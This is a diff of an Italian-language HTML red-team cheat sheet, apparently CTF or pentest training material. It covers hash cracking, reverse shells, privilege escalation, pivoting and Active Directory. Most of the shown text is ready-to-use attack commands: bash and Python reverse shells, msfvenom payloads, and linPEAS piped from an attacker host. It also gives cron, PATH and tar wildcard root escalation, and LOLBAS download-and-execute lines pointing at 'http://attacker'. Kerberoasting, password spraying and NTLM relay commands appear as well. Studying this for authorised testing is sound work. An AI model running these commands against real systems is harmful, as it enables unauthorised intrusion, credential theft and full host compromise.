+  <div class="next">Se cracki la password: usala per login (SSH, web, RDP) → R4 (Shell). Se non cracki, prova altre wordlist o passa ad altri vettori.</div>
+
+  <h3>Tipi di hash</h3>
+  <div class="why">Non tutti gli hash sono uguali. MD5/SHA1 sono veloci (miliardi/sec su GPU); bcrypt/Argon2 sono lenti (migliaia/sec). La differenza è enorme.</div>
+  <div class="how">
+    <table>
+      <tr><th>Hash</th><th>Velocità</th><th>Quando trovarlo</th></tr>
+      <tr><td>MD5</td><td>164 miliardi/s</td><td>DB applicativi vecchi</td></tr>
+      <tr><td>NTLM</td><td>304 miliardi/s</td><td>SAM, NTDS.dit, memoria</td></tr>
+      <tr><td>bcrypt</td><td>~5k/s (cost 12)</td><td>DB moderni (Django, Laravel)</td></tr>
+      <tr><td>Argon2id</td><td>&lt;1k/s</td><td>DB recenti</td></tr>
+      <tr><td>Kerberos AS-REP</td><td>4 miliardi/s</td><td>AD, AS-REP roasting</td></tr>
+      <tr><td>Kerberos TGS</td><td>4 miliardi/s</td><td>AD, Kerberoasting</td></tr>
+    </table>
+  </div>
+  <div class="when">Prima di lanciare hashcat, identifica il tipo con hashid o Name-That-Hash.</div>
+  <div class="next">Con l'algoritmo identificato, scegli la modalità hashcat giusta (-m) e parti con rockyou senza regole.</div>
 
   <h3>Hashcat</h3>
-  <pre># MD5
+  <div class="why">Il password cracker GPU di riferimento. 400+ algoritmi, sfrutta GPU, open source. Se hai una GPU decente, batte qualsiasi alternativa.</div>
+  <div class="how">
+    <pre><span class="comment"># MD5</span>
 hashcat -m 0 hash.txt rockyou.txt
 
-# NTLM
+<span class="comment"># NTLM (da SAM/NTDS.dit)</span>
 hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
 
-# bcrypt
+<span class="comment"># bcrypt</span>
 hashcat -m 3200 hash.txt rockyou.txt
 
-# JWT HS256
+<span class="comment"># JWT HS256</span>
 hashcat -m 16500 jwt.txt rockyou.txt
 
-# Kerberos AS-REP
+<span class="comment"># Kerberos AS-REP</span>
 hashcat -m 18200 asrep.hash rockyou.txt
 
-# Kerberos TGS (Kerberoasting)
+<span class="comment"># Kerberos TGS (Kerberoasting)</span>
 hashcat -m 13100 tgs.hash rockyou.txt
 
-# Mask attack
+<span class="comment"># Mask attack</span>
 hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?d?d?d?d
 
-# Mostra risultati
+<span class="comment"># Mostra risultati</span>
 hashcat -m &lt;mode&gt; hash.txt --show</pre>
+  </div>
+  <div class="when">Sempre quando hai hash. Parti da rockyou senza regole (veloce), poi aggiungi best64, poi OneRuleToRuleThemAll, poi mask.</div>
+  <div class="next">Se rockyou + best64 non cracka in 10 minuti, aggiungi regole più aggressive o wordlist più grandi (weakpass). Se ancora no, è una password robusta: passa ad altri vettori.</div>
 
   <h3>John the Ripper</h3>
-  <pre>john --wordlist=rockyou.txt hash.txt
-john --format=bcrypt --wordlist=rockyou.txt hash.txt
-john --show hash.txt
+  <div class="why">Alternativa a hashcat, CPU-first. Ha script di conversione (2john) che trasformano formati arbitrari (ZIP, PDF, SSH key) in hash crackabili.</div>
+  <div class="how">
+    <pre><span class="comment"># Dictionary attack</span>
+john --wordlist=rockyou.txt hash.txt
 
-# Conversion scripts
+<span class="comment"># Formato specifico</span>
+john --format=bcrypt --wordlist=rockyou.txt hash.txt
+
+<span class="comment"># Conversion scripts</span>
 zip2john file.zip &gt; hash
 ssh2john key &gt; hash
 keepass2john vault.kdbx &gt; hash</pre>
+  </div>
+  <div class="when">Quando hai un file protetto da password (ZIP, PDF, SSH key, KeePass). Gli script 2john lo convertono in hash.</div>
+  <div class="next">Dopo la conversione con 2john, passa l'hash a hashcat (più veloce su GPU). John è utile soprattutto per la conversione.</div>
 
   <h3>Wordlist</h3>
-  <ul>
-    <li><code>rockyou.txt</code> (Kali: <code>/usr/share/wordlists/rockyou.txt.gz</code>)</li>
-    <li>SecLists: github.com/danielmiessler/SecLists</li>
-    <li>CeWL: genera wordlist da sito target</li>
-    <li>cupp: wordlist mirate a profilo</li>
-  </ul>
-
-  <h3>Online attacks</h3>
-  <pre># Hydra
-hydra -l user -P passwords.txt ssh://target
-hydra -L users.txt -p 'Primavera2026!' ssh://target -t 4 -W 10
-
-# NetExec password spraying
-nxc smb target.txt -u users.txt -p 'Primavera2026!' --continue-on-success
-
-# Kerbrute
-kerbrute passwordspray -d dominio.corp users.txt 'Primavera2026!'</pre>
+  <div class="why">La qualità della wordlist determina la qualità del cracking. rockyou.txt è il dataset storico (32 milioni di password reali da un breach del 2009).</div>
+  <div class="how">
+    <ul>
+      <li><b>rockyou.txt</b>: standard, in Kali a <code>/usr/share/wordlists/rockyou.txt.gz</code></li>
+      <li><b>SecLists</b>: github.com/danielmiessler/SecLists</li>
+      <li><b>CeWL</b>: genera wordlist da scraping del sito target</li>
+      <li><b>cupp</b>: wordlist mirate a profilo persona</li>
+    </ul>
+    <pre><span class="comment"># CeWL - genera wordlist da sito</span>
+cewl -w wordlist.txt -d 3 -m 5 https://target.com</pre>
+  </div>
+  <div class="when">Sempre come primo tentativo. Se il target è un'azienda italiana, aggiungi wordlist italiane (nomi, città, squadre).</div>
+  <div class="next">Se rockyou non basta, prova CeWL sul sito target + regole Mentalist (anno, simboli, leet).</div>
 
   <h3>Kerberos roasting</h3>
-  <pre># AS-REP roasting
+  <div class="why">In Active Directory, AS-REP roasting e Kerberoasting estraggono hash crackabili offline da utenti e account di servizio. Silenziosi (nessun lockout).</div>
+  <div class="how">
+    <pre><span class="comment"># AS-REP roasting</span>
 GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
 
-# Kerberoasting
-GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash</pre>
+<span class="comment"># Kerberoasting</span>
+GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash
 
-  <h3>Pattern umani</h3>
-  <ul>
-    <li>Parola + anno, parola + simbolo, leet, nome+cognome</li>
-    <li>Tastiera walk, stagioni, citta, squadre</li>
-  </ul>
+<span class="comment"># Cracking</span>
+hashcat -m 18200 -a 0 asrep.hash rockyou.txt
+hashcat -m 13100 -a 0 tgs.hash rockyou.txt -r rules/OneRuleToRuleThemAll.rule</pre>
+  </div>
+  <div class="when">Quando sei in una rete AD. Sempre come primo test, prima di attacchi più complessi.</div>
+  <div class="next">Se cracki un account di servizio: usa le credenziali per accesso → R7 (AD). Se cracki un utente: cerca i suoi privilegi in BloodHound.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R4 -->
 <section id="r4">
-  <h2>4. Shells & Payloads (R4)</h2>
+  <h2>4. Shells &amp; Payloads (R4)</h2>
+  <div class="box box-info">Il foothold (comando singolo) diventa controllo stabile (shell interattiva). Il momento in cui "hai vinto" la prima parte della challenge.</div>
+
+  <h3>Perché la shell è importante</h3>
+  <div class="why">Un singolo comando eseguito è un foothold. Una shell interattiva è controllo. La differenza è tra "ho fatto id sul server" e "posso muovermi, leggere file, eseguire comandi arbitrari".</div>
+  <div class="how">La shell è un canale bidirezionale: invii comandi, ricevi output. Le due grandi classi sono bind shell e reverse shell.</div>
+  <div class="when">Sempre dopo aver ottenuto esecuzione di codice (RCE) via web, SQLi --os-shell, o command injection.</div>
+  <div class="next">Dopo la shell, stabilizza (magic dance) e passa a R5 (PrivEsc) per diventare root/SYSTEM.</div>
+
+  <h3>Bind vs Reverse shell</h3>
+  <div class="why">Bind = target ascolta, attaccante si connette. Reverse = attaccante ascolta, target si connette outbound. La reverse domina perché il traffico outbound passa firewall/NAT.</div>
+  <div class="how">
+    <table>
+      <tr><th>Aspetto</th><th>Bind shell</th><th>Reverse shell</th></tr>
+      <tr><td>Chi ascolta</td><td>Target</td><td>Attaccante</td></tr>
+      <tr><td>Chi si connette</td><td>Attaccante</td><td>Target</td></tr>
+      <tr><td>Funziona dietro NAT</td><td>Solo se target esposto</td><td>Quasi sempre</td></tr>
+      <tr><td>Rilevabilità</td><td>Porta in ascolto sul target</td><td>Connessione outbound verso IP esterno</td></tr>
+    </table>
+  </div>
+  <div class="when">Sempre reverse shell nel 99% dei casi. Bind shell solo in LAN senza NAT.</div>
+  <div class="next">Prepara il listener sull'attaccante, poi lancia il payload sul target.</div>
 
   <h3>Listener</h3>
-  <pre>nc -lvnp 4444
+  <div class="why">Il listener riceve la shell. Deve essere pronto PRIMA di lanciare il payload.</div>
+  <div class="how">
+    <pre><span class="comment"># nc base</span>
+nc -lvnp 4444
+
+<span class="comment"># rlwrap (aggiunge history/editing)</span>
 rlwrap nc -lvnp 4444
+
+<span class="comment"># ncat con TLS</span>
 ncat --ssl -lvnp 4444
-pwncat-cs -lp 4444  # auto-stabilize + post-ex</pre>
+
+<span class="comment"># pwncat-cs (auto-stabilize + post-ex)</span>
+pwncat-cs -lp 4444</pre>
+  </div>
+  <div class="when">Sempre, prima di lanciare il payload. Scegli nc per semplicità, pwncat per sessioni lunghe.</div>
+  <div class="next">Dopo aver ricevuto la shell, fai la stabilization.</div>
 
   <h3>Reverse shell bash</h3>
-  <pre>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</pre>
+  <div class="why">Il one-liner bash è il payload più semplice e più utile su Linux. Usa /dev/tcp, una feature di bash.</div>
+  <div class="how">
+    <pre>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</pre>
+    <ul>
+      <li><code>-i</code>: shell interattiva</li>
+      <li><code>&gt;&amp;</code>: redirect di stdout e stderr</li>
+      <li><code>/dev/tcp/IP/PORT</code>: apre connessione TCP (feature bash, non file reale)</li>
+      <li><code>0&gt;&amp;1</code>: redirect di stdin al descrittore 1</li>
+    </ul>
+  </div>
+  <div class="when">Quando hai command injection su Linux e bash è disponibile.</div>
+  <div class="next">Se bash non c'è, prova sh, Python, PHP. Usa revshells.com per generare il payload giusto per il contesto.</div>
 
   <h3>Reverse shell Python</h3>
-  <pre>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;IP&gt;",&lt;PORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'</pre>
+  <div class="why">Python è quasi sempre presente su Linux moderno. Il payload è più lungo ma produce una shell con PTY (meno stabilization manuale).</div>
+  <div class="how">
+    <pre>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;IP&gt;",&lt;PORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'</pre>
+  </div>
+  <div class="when">Quando bash non c'è o quando vuoi una shell già semi-stabilizzata.</div>
+  <div class="next">Dopo aver ottenuto la shell, fai il magic dance per completare la stabilization.</div>
 
   <h3>Stabilization (magic dance)</h3>
-  <pre># Dentro la raw shell
+  <div class="why">Una raw shell non ha PTY: niente tab completion, niente Ctrl+C, niente vim, sudo bloccato. La stabilization trasforma la raw shell in una PTY completa.</div>
+  <div class="how">
+    <pre><span class="comment"># Dentro la raw shell (Linux target)</span>
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# Ctrl+Z per backgroundare
-# Sull'attaccante
+<span class="comment"># Ctrl+Z per backgroundare</span>
+<span class="comment"># Sull'attaccante</span>
 stty raw -echo; fg
-# (Enter Enter)
+<span class="comment"># (Enter Enter)</span>
 
-# Sulla shell remota
+<span class="comment"># Sulla shell remota</span>
 export TERM=xterm
 stty rows &lt;N&gt; columns &lt;M&gt;</pre>
+  </div>
+  <div class="when">Sempre, subito dopo aver ricevuto la shell. Prima di qualsiasi comando che richieda terminale (sudo, vim).</div>
+  <div class="next">Dopo la stabilization, esegui id, whoami, uname -a per capire chi sei e dove sei → passa a R5 (PrivEsc).</div>
 
   <h3>msfvenom</h3>
-  <pre># EXE Windows x64 Meterpreter
+  <div class="why">Genera payload standalone per ogni contesto. Utile per Windows, Android, e quando serve un eseguibile.</div>
+  <div class="how">
+    <pre><span class="comment"># EXE Windows x64 Meterpreter</span>
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o payload.exe
 
-# ELF Linux shell reverse
+<span class="comment"># ELF Linux shell reverse</span>
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o shell.elf
 
-# JSP webshell
+<span class="comment"># JSP webshell</span>
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw -o shell.jsp</pre>
+  </div>
+  <div class="when">Quando il contesto richiede un eseguibile (Windows, Android) o quando non hai un one-liner disponibile.</div>
+  <div class="next">Dopo aver generato il payload, trasferiscilo sul target (upload, download, SMB) ed eseguilo con il listener già pronto.</div>
 
   <h3>Metasploit</h3>
-  <pre>msfconsole
+  <div class="why">Framework di exploitation completo. 4.000+ exploit, 1.500+ payload. Meterpreter è il payload di punta: in-memory, cifrato, con comandi built-in.</div>
+  <div class="how">
+    <pre>msfconsole
 msf6 &gt; use exploit/multi/handler
 msf6 &gt; set payload windows/x64/meterpreter/reverse_tcp
 msf6 &gt; set LHOST &lt;IP&gt;
 msf6 &gt; set LPORT &lt;PORT&gt;
 msf6 &gt; run</pre>
-
-  <h3>revshells.com</h3>
-  <div class="box box-ok">Genera payload per ogni linguaggio/contesto. Inserisci IP e porta, copia.</div>
+  </div>
+  <div class="when">Quando hai un exploit Metasploit per una vulnerabilità specifica, o quando vuoi ricevere una sessione Meterpreter da un payload standalone.</div>
+  <div class="next">Dopo aver una sessione Meterpreter, esplora i comandi: sysinfo, getuid, hashdump, getsystem, migrate. Passa a R5 per privilege escalation.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R5 -->
 <section id="r5">
   <h2>5. Privilege Escalation (R5)</h2>
+  <div class="box box-info">PrivEsc = trasformazione di shell low-privilege in root (Linux) o SYSTEM (Windows). 80% del lavoro è enumerazione.</div>
 
-  <h3>Linux enum</h3>
-  <pre>id; whoami; uname -a; cat /etc/os-release
+  <h3>Perché PrivEsc è cruciale</h3>
+  <div class="why">La shell tipicamente arriva con i privilegi del processo compromesso (www-data su Linux, IIS APPPOOL su Windows). Nessuno di questi è amministratore. PrivEsc è il salto verso il controllo totale.</div>
+  <div class="how">Le strade sono molte: kernel exploit, misconfigurazioni file system, servizi deboli, credenziali esposte, binari abusabili. Enumerazione + sfruttamento.</div>
+  <div class="when">Sempre dopo aver stabilizzato la shell (R4).</div>
+  <div class="next">Dopo PrivEsc, hai root/SYSTEM. Passa a R6 (Pivoting) se sei in una rete, o R7 (AD) se sei in dominio.</div>
+
+  <h3>Linux enum manuale</h3>
+  <div class="why">Prima di automazione, fai almeno una volta l'enum manuale. Insegna cosa cercano i tool e perché. Su un sistema sconosciuto richiede 30-60 minuti.</div>
+  <div class="how">
+    <pre><span class="comment"># Identità</span>
+id; whoami; uname -a; cat /etc/os-release
+
+<span class="comment"># Sudo</span>
 sudo -l
+
+<span class="comment"># SUID</span>
 find / -perm -u=s -type f 2&gt;/dev/null
+
+<span class="comment"># Capabilities</span>
 getcap -r / 2&gt;/dev/null
+
+<span class="comment"># Cron</span>
 cat /etc/crontab; ls -la /etc/cron.*
+
+<span class="comment"># File scrivibili</span>
 find / -writable -type d 2&gt;/dev/null | grep -v proc
+find / -perm -o+w -type f 2&gt;/dev/null | grep -E "(passwd|shadow|sudoers)"
+
+<span class="comment"># Servizi locali</span>
 ss -tlnp
-cat ~/.bash_history /root/.bash_history 2&gt;/dev/null</pre>
+
+<span class="comment"># History</span>
+cat ~/.bash_history /root/.bash_history 2&gt;/dev/null
+
+<span class="comment"># Credenziali in file</span>
+grep -rE "password|pwd|passwd" /etc /var/www 2&gt;/dev/null | head -50</pre>
+  </div>
+  <div class="when">Sempre quando ottieni shell Linux. Anche se pensi di sapere già dove guardare.</div>
+  <div class="next">Se trovi SUID o sudo senza password → GTFOBins. Se trovi cron script scrivibile → modifica per shell root. Se trovi credenziali → prova su su/ssh.</div>
 
   <h3>linPEAS</h3>
-  <pre>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>
+  <div class="why">Automatizza l'enumerazione manuale. Output colorato con priorità (rosso = sfruttabile). Leggi prima tutto il rosso, poi il giallo.</div>
+  <div class="how">
+    <pre><span class="comment"># Download + esecuzione</span>
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="comment"># O via web server dell'attaccante</span>
+curl http://&lt;ATTACKER&gt;:8080/linpeas.sh | sh</pre>
+  </div>
+  <div class="when">Sempre, dopo aver ottenuto shell Linux. Risparmia 30 minuti di enum manuale.</div>
+  <div class="next">Leggi l'output con attenzione. Per ogni finding rosso/giallo, vai su GTFOBins o cerca CVE specifiche. Poi applica il sfruttamento.</div>
 
   <h3>SUID exploit (GTFOBins)</h3>
-  <pre># find SUID
+  <div class="why">Un binario SUID-root mal configurato permette esecuzione privilegiata. GTFOBins cataloga ogni binario abusabile con payload pronti.</div>
+  <div class="how">
+    <pre><span class="comment"># find SUID</span>
 find . -name x -exec /bin/sh -p \;
 
-# vim SUID
+<span class="comment"># vim SUID</span>
 vim -c ':!/bin/sh -p'
 
-# python SUID
+<span class="comment"># python SUID o con cap_setuid</span>
 python -c 'import os; os.setuid(0); os.system("/bin/sh")'</pre>
+  </div>
+  <div class="when">Quando find / -perm -u=s trova binari non standard. Sempre consulta GTFOBins per ognuno.</div>
+  <div class="next">Se GTFOBins non ha il binario, cerca CVE specifiche per quella versione. Se nessuno funziona, passa ad altri vettori (sudo, cron, kernel).</div>
 
   <h3>Sudo misconfig</h3>
-  <pre># (root) NOPASSWD: /usr/bin/find
+  <div class="why">sudo -l rivela quali comandi puoi eseguire come root. Casi tipici: NOPASSWD su find, vim, less, awk. Ognuno ha escape a shell.</div>
+  <div class="how">
+    <pre><span class="comment"># (root) NOPASSWD: /usr/bin/find</span>
 sudo find /etc -exec /bin/sh \;
 
-# (root) NOPASSWD: /usr/bin/less
+<span class="comment"># (root) NOPASSWD: /usr/bin/less</span>
 sudo less /etc/profile
-# nel less: !sh
+<span class="comment"># nel less: !sh</span>
 
-# (root) NOPASSWD: /usr/bin/awk
+<span class="comment"># (root) NOPASSWD: /usr/bin/awk</span>
 sudo awk 'BEGIN {system("/bin/sh")}'</pre>
+  </div>
+  <div class="when">Sempre dopo sudo -l. Ogni comando permesso va verificato su GTFOBins sezione "Sudo".</div>
+  <div class="next">Se sudo non ha escape, controlla se la variabile env_keep include LD_PRELOAD (compili .so custom). Se no, passa a cron/PATH.</div>
 
   <h3>Cron / PATH / Wildcard</h3>
-  <ul>
-    <li>Script cron scrivibile, modifica per shell root</li>
-    <li>PATH hijacking: fake <code>cat</code> in <code>$PATH</code></li>
-    <li>Wildcard injection: <code>tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh</code></li>
-  </ul>
+  <div class="why">Script eseguiti da cron come root, ma scrivibili da utenti normali. PATH hijacking: script invoca comando senza path assoluto. Wildcard injection: tar con *.</div>
+  <div class="how">
+    <pre><span class="comment"># Cron job writable</span>
+echo '/bin/bash -c "cp /bin/bash /tmp/rb; chmod +s /tmp/rb"' &gt;&gt; /opt/scripts/backup.sh
+<span class="comment"># Aspetta 1 minuto</span>
+/tmp/rb -p
+
+<span class="comment"># PATH hijacking</span>
+echo '#!/bin/sh' &gt; /home/user/bin/cat
+echo '/bin/bash -p' &gt;&gt; /home/user/bin/cat
+chmod +x /home/user/bin/cat
+
+<span class="comment"># Wildcard injection (tar -czf backup.tar.gz *)</span>
+echo "" &gt; "--checkpoint=1"
+echo "" &gt; "--checkpoint-action=exec=sh shell.sh"</pre>
+  </div>
+  <div class="when">Quando linPEAS segnala cron job scrivibili o script in PATH modificabili.</div>
+  <div class="next">Se cron funziona, aspetti 1 minuto e hai root. Se PATH funziona, aspetti che lo script venga lanciato. Se no, passa a kernel exploit.</div>
 
   <h3>Windows enum</h3>
-  <pre>whoami /priv /groups /all
+  <div class="why">Windows ha un modello di privilegi diverso (SYSTEM > Administrator > utente). I vettori sono diversi da Linux.</div>
+  <div class="how">
+    <pre><span class="comment"># Identità e privilegi</span>
+whoami /priv /groups /all
+
+<span class="comment"># Sistema</span>
 systeminfo
-sc query
-schtasks /query /fo LIST /v
 wmic qfe get HotFixID,InstalledOn
+
+<span class="comment"># Servizi</span>
+sc query
+sc qc &lt;service&gt;
+
+<span class="comment"># Scheduled tasks</span>
+schtasks /query /fo LIST /v
+
+<span class="comment"># Credenziali in registry</span>
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+<span class="comment"># AlwaysInstallElevated</span>
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</pre>
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
-  <h3>winPEAS</h3>
-  <pre>winpeasx64.exe
-winpeas.bat</pre>
+<span class="comment"># Stored credentials</span>
+cmdkey /list</pre>
+  </div>
+  <div class="when">Sempre quando ottieni shell Windows.</div>
+  <div class="next">Se whoami /priv mostra SeImpersonatePrivilege → Potato attacks. Se AlwaysInstallElevated = 1 → MSI come SYSTEM. Se servizio con path non quotato → injection.</div>
 
-  <h3>PowerUp</h3>
-  <pre>Set-ExecutionPolicy Bypass -Scope Process
+  <h3>winPEAS / PowerUp</h3>
+  <div class="why">Automatizzano l'enumerazione Windows. winPEAS come linPEAS, PowerUp con funzioni specifiche per privesc.</div>
+  <div class="how">
+    <pre><span class="comment"># winPEAS</span>
+winpeasx64.exe
+winpeas.bat
+
+<span class="comment"># PowerUp</span>
+Set-ExecutionPolicy Bypass -Scope Process
 . .\PowerUp.ps1
 Invoke-AllChecks</pre>
-
-  <h3>AlwaysInstallElevated</h3>
-  <pre>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi -o evil.msi
-# Su target
-msiexec /quiet /qn /i evil.msi</pre>
+  </div>
+  <div class="when">Sempre dopo aver ottenuto shell Windows. WinPEAS per enum generale, PowerUp per privesc specifico.</div>
+  <div class="next">Leggi l'output evidenziato. Ogni finding ha uno sfruttamento associato in PowerUp o in HackTricks.</div>
 
   <h3>Token impersonation (SeImpersonate)</h3>
-  <ul>
-    <li><b>GodPotato</b>, <b>PrintSpoofer</b>, <b>RoguePotato</b>, <b>JuicyPotato</b></li>
-    <li>Output: shell SYSTEM</li>
-  </ul>
+  <div class="why">SeImpersonatePrivilege permette di impersonare processi più privilegiati. Potato attacks (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato) sfruttano questo privilegio.</div>
+  <div class="how">
+    <pre><span class="comment"># GodPotato (2026, Windows recenti)</span>
+GodPotato.exe -cmd "cmd /c whoami"
+<span class="comment"># Output: nt authority\system</span></pre>
+  </div>
+  <div class="when">Quando whoami /priv mostra SeImpersonatePrivilege (comune su IIS APPPOOL, MSSQL service).</div>
+  <div class="next">Dopo SYSTEM, dumpa SAM/NTDS.dit con secretsdump. Passa a R7 (AD) se sei in dominio.</div>
 
   <h3>LOLBAS</h3>
-  <ul>
-    <li><code>mshta</code>, <code>rundll32</code>, <code>regsvr32</code>, <code>certutil</code>, <code>bitsadmin</code>, <code>MSBuild</code>, <code>InstallUtil</code></li>
-    <li>Bypass AppLocker/WDAC</li>
-  </ul>
+  <div class="why">Binari Microsoft trusted (firmati) che possono essere abusati per esecuzione, download, bypass AppLocker.</div>
+  <div class="how">
+    <ul>
+      <li><code>mshta http://attacker/payload.hta</code></li>
+      <li><code>rundll32 javascript:...</code></li>
+      <li><code>regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll</code></li>
+      <li><code>certutil -urlcache -split -f http://attacker/file.exe out.exe</code></li>
+    </ul>
+  </div>
+  <div class="when">Quando AppLocker/WDAC blocca eseguibili non firmati. LOLBAS bypassa.</div>
+  <div class="next">Dopo aver eseguito il payload via LOLBAS, stabilizza la shell e passa a R5 (PrivEsc).</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R6 -->
 <section id="r6">
-  <h2>6. Pivoting & Tunneling (R6)</h2>
+  <h2>6. Pivoting &amp; Tunneling (R6)</h2>
+  <div class="box box-info">Usare un host compromesso come trampolino per raggiungere altri host in reti interne segmentate.</div>
+
+  <h3>Perché il pivoting è importante</h3>
+  <div class="why">Le reti aziendali sono segmentate: DMZ, rete utenti, rete server. La compromissione inizia in DMZ ma l'obiettivo è in profondità. Senza pivoting, il red teamer si ferma al primo host.</div>
+  <div class="how">Il pivot instrada il traffico dell'attaccante attraverso l'host compromesso. Il firewall dice no all'IP dell'attaccante ma sì all'host interno.</div>
+  <div class="when">Quando hai shell su un host e scopri che può raggiungere altre subnet che tu non raggiungi direttamente.</div>
+  <div class="next">Dopo il pivot, ripeti la recon (R1) sulla nuova subnet. Poi passa a R5 (PrivEsc) o R7 (AD).</div>
 
   <h3>SSH port forwarding</h3>
-  <pre># Local forward
+  <div class="why">Il tool di pivoting più universale. Se c'è SSH sul pivot, tre flag coprono la maggior parte dei casi.</div>
+  <div class="how">
+    <pre><span class="comment"># Local forward (porta su client → destinazione via pivot)</span>
 ssh -L 3306:192.168.50.10:3306 user@pivot
 
-# Dynamic SOCKS
+<span class="comment"># Dynamic SOCKS proxy</span>
 ssh -D 1080 user@pivot
 
-# Background + no shell + compressione
+<span class="comment"># Background + no shell + compressione</span>
 ssh -f -N -D 1080 -C user@pivot</pre>
+  </div>
+  <div class="when">Quando il pivot ha SSH accessibile. Local forward per singolo servizio, dynamic SOCKS per navigazione rete interna.</div>
+  <div class="next">Se usi SSH -D, configura proxychains e passa a R6 proxychains. Se usi -L, connettiti direttamente a localhost:porta.</div>
 
   <h3>proxychains</h3>
-  <pre># /etc/proxychains4.conf -> socks5 127.0.0.1 1080
+  <div class="why">Una volta aperto un SOCKS proxy, proxychains permette di usare tool nativi (nmap, curl, smbclient) attraverso il proxy.</div>
+  <div class="how">
+    <pre><span class="comment"># /etc/proxychains4.conf → socks5 127.0.0.1 1080</span>
 proxychains nmap -Pn -sT -n 192.168.50.0/24 -p 22,80,443,445
 proxychains curl http://internal/</pre>
+  </div>
+  <div class="when">Sempre dopo aver aperto un SOCKS (SSH -D, chisel, ligolo).</div>
+  <div class="next">Nota: proxychains supporta solo TCP. Per UDP usa ligolo-ng. Nmap con -sT (non -sS) e -Pn -n.</div>
 
   <h3>Chisel</h3>
-  <pre># Attaccante
+  <div class="why">Tunneling TCP over HTTP. Singolo binario Go, cross-platform. Funziona dove SSH non è disponibile ma puoi caricare un binario.</div>
+  <div class="how">
+    <pre><span class="comment"># Attaccante</span>
 ./chisel server --reverse --port 8080 --auth user:pass
 
-# Pivot
+<span class="comment"># Pivot</span>
 ./chisel client --auth user:pass http://&lt;ATTACKER&gt;:8080 R:1080:socks</pre>
+  </div>
+  <div class="when">Quando il pivot non ha SSH ma puoi caricare un binario. Sempre su internal network o tramite HTTP.</div>
+  <div class="next">Dopo il tunnel, usa proxychains per navigare la rete interna. Poi ripeti recon.</div>
 
   <h3>Ligolo-ng</h3>
-  <pre># Attaccante (root)
+  <div class="why">Next-gen pivoting. Invece di SOCKS, crea interfaccia TUN sull'attaccante. Routing trasparente, no proxychains, TCP+UDP+ICMP.</div>
+  <div class="how">
+    <pre><span class="comment"># Attaccante (root)</span>
 sudo ./ligolo-proxy -selfcert
 &gt; session
 &gt; start --tun ligolo
 sudo ip route add 192.168.50.0/24 dev ligolo
 
-# Pivot
+<span class="comment"># Pivot</span>
 ./ligolo-agent -connect &lt;ATTACKER&gt;:11601 -ignore-cert</pre>
-
-  <h3>sshuttle</h3>
-  <pre>sshuttle -r user@pivot 192.168.50.0/24 10.0.100.0/24</pre>
+  </div>
+  <div class="when">Quando vuoi performance native, UDP, o multi-hop. Richiede root sull'attaccante.</div>
+  <div class="next">Dopo il routing, nmap nativo (anche -sS) sulla subnet interna. Passa a R1 per recon della nuova rete.</div>
 
   <h3>NTLM relay</h3>
-  <pre># Responder in modalita analyze
+  <div class="why">Tecnica peculiare di Windows/AD. Non sposta bit: sposta autenticazioni. L'attaccante costringe un client a inviargli credenziali NTLM, poi le inoltra verso un altro servizio.</div>
+  <div class="how">
+    <pre><span class="comment"># Responder in modalità analyze</span>
 sudo responder -I eth0 -A
 
-# ntlmrelayx
+<span class="comment"># ntlmrelayx</span>
 ntlmrelayx.py -tf targets.txt -smb2support -socks</pre>
+  </div>
+  <div class="when">In engagement AD, quando hai accesso alla stessa subnet di workstation Windows e SMB signing non è enforced sui target.</div>
+  <div class="next">Se il relay funziona: sessioni SOCKS autenticate disponibili via proxychains. Passa a R7 (AD) per lateral movement.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- R7 -->
 <section id="r7">
   <h2>7. Active Directory (R7)</h2>
+  <div class="box box-info">AD è l'infrastruttura centrale di quasi ogni azienda. Compromettere AD = compromettere tutto.</div>
+
+  <h3>Perché AD è la torre di controllo</h3>
+  <div class="why">Il 90% delle aziende occidentali usa Active Directory. Ogni account, workstation, server, stampante è in AD. Compromettere AD significa controllo totale.</div>
+  <div class="how">AD è organizzato in domini (acme.corp), oggetti (user, computer, group, OU, GPO), protocolli (Kerberos, LDAP, SMB). I gruppi privilegiati critici sono Domain Admins, Enterprise Admins, Administrators.</div>
+  <div class="when">Quando sei in una rete Windows con dominio. Identifichi AD da DNS (dominio.corp), DC (porta 88 Kerberos, 389 LDAP), SMB.</div>
